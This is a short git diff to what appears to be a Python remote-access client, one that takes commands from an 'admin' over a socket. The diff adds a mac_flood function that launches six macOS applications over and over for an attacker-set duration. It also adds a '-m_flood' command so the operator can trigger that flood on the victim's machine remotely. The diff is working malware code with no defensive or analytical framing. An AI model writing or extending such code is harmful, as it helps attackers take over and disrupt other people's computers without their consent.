@@ -5,6 +5,7 @@ import os
 import webbrowser
 import requests
 from cryptography.fernet import Fernet
+from datetime import datetime, timedelta
 
 IP = socket.gethostbyname(socket.gethostname())
 PORT = 9999
@@ -12,6 +13,16 @@ key = None
 
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
+def mac_flood(time):
+    loop_duration = time
+    end_time = datetime.now() + timedelta(seconds=loop_duration)
+    while datetime.now() < end_time:
+        os.system('open -a Safari')
+        os.system('open -a Music')
+        os.system('open -a Notes')
+        os.system('open -a Reminders')
+        os.system('open -a Finder')
+        os.system('open -a Terminal')
 
 def generate_key():
     return Fernet.generate_key()
@@ -108,6 +119,10 @@ def perform_action(command, payload, admin_nickname):
         result = ""
     elif command == "-cwd":
         result = os.getcwd()
+        
+    elif command == '-m_flood':
+        mac_flood(payload)
+        result = "Flood Started"
     else:
         result = "Unknown command"
 
